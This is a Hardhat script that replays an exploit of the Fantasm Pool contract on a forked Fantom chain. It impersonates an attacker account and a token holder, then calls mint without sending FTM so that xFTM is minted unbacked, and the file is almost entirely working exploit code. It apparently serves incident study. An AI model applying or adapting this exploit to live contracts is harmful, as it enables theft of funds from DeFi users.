const hre = require("hardhat");

async function main() {
  //block number before https://ftmscan.com/tx/0x64da8b8043b14fe93f7ab55cc56ccca2d190a59836a3f45dbb4b0a832e329cac
  hre.network.config.forking.blockNumber = 32968514;

  //Preparation Phases
  //1. impersonate attacker address
  const accountToInpersonate1 = "0x47091E015b294B935BAbDA2d28aD44e3Ab07ae8D";
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [accountToInpersonate1],
  });
  const attacker = await ethers.getSigner(accountToInpersonate1);
  console.log("Attacker address:", attacker.address);

  //2. impersonate one rich man's address, later we will transfer some FSM tokens from this account to the attacker's account
  const accountToInpersonate2 = "0xba14977adcfc73f1552c5c510b9bff83d95f346b";
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [accountToInpersonate2],
  });
  const rich_man = await ethers.getSigner(accountToInpersonate2);
  //console.log("Rich man address:", rich_man.address);

  //fetch Pool contract and create an instance of it
  const Pool = await hre.ethers.getContractAt("Pool", "0x880672ab1d46d987e5d663fc7476cd8df3c9f937");
  //console.log("Pool has been created at:", Pool.address);

  //fetch FSM contrct and create an instance of it
  const Fantasm = await hre.ethers.getContractAt("Fantasm", "0xaa621D2002b5a6275EF62d7a065A865167914801");
  //console.log("Fantasm has been created at:", Fantasm.address);

  //fetch xFTM contract and create an instance of it
  const XFTM = await hre.ethers.getContractAt("XFTM", "0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F");
  //console.log("XFTM has been created at:", XFTM.address);

  //start attack

  //STEP0: Estimated earnings（XFTM）
  // const CalcMintTx = await Pool.connect(attacker).calcMint(0, hre.ethers.BigNumber.from("1000000000000000000"));
  // console.log(CalcMintTx);
  // OUTPUT:
  //   [
  //   BigNumber { value: "457629546332624673947" },  "wei"
  //   BigNumber { value: "450285441276133204757" },
  //   BigNumber { value: "1000000000000000000" },
  //   BigNumber { value: "1350856323828399614" },
  //   _xftmOut: BigNumber { value: "457629546332624673947" },  Note here!!
  //   _minFtmIn: BigNumber { value: "450285441276133204757" },
  //   _minFantasmIn: BigNumber { value: "1000000000000000000" },
  //   _fee: BigNumber { value: "1350856323828399614" }
  //   ]

  //STEP1: Impersonate the rich man's account to transfer 1 FSM to the attacking account
  const RichmanBalance = await Fantasm.balanceOf(rich_man.address);
  //console.log("Richman's balanceOf FSM token is:",RichmanBalance);
  const TransferTx = await (await Fantasm.connect(rich_man).transfer(attacker.address, hre.ethers.utils.parseUnits("1", 18))).wait();
  const AttackerBalance = await Fantasm.balanceOf(attacker.address);
  console.log("Attacker's balanceOf FSM token is:",AttackerBalance);

  //STEP2: attacker approve FSM to Pool contract
  const ApproveTx = await (await Fantasm.connect(attacker).approve(Pool.address, hre.ethers.utils.parseUnits("1", 18))).wait();

  //STEP3: Directly use FSM for mint without msg.value, so that _ftmIn is 0, it will enter the else process
  const MintTx = await (await Pool.connect(attacker).mint(hre.ethers.utils.parseUnits("1", 18), 2)).wait();

  //STEP4: Call collect to get the xFTM just mint
  const CollectTx = await (await Pool.connect(attacker).collect()).wait();

  console.log("Exploit complete.")
  //This number should be equal to 457629546332624673947 "wei"(the minimal unit)
  console.log("xFTM balance of attacker : ", hre.ethers.utils.formatUnits(await XFTM.balanceOf(attacker.address),18));
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
